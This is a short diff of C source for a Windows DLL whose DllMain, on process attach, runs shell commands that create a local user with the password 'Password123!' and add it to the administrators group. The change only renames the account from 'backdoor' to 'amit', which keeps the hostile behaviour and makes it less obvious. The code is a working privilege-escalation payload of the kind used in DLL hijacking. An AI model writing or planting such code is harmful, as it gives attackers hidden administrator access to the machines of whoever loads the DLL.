@@ -10,8 +10,8 @@ LPVOID lpReserved )
     {
         case DLL_PROCESS_ATTACH: 
         int i;
-  	    i = system ("net user backdoor Password123! /add");
-  	    i = system ("net localgroup administrators backdoor /add");
+  	    i = system ("net user amit Password123! /add");
+  	    i = system ("net localgroup administrators amit /add");
         break;
         case DLL_THREAD_ATTACH:
         break;
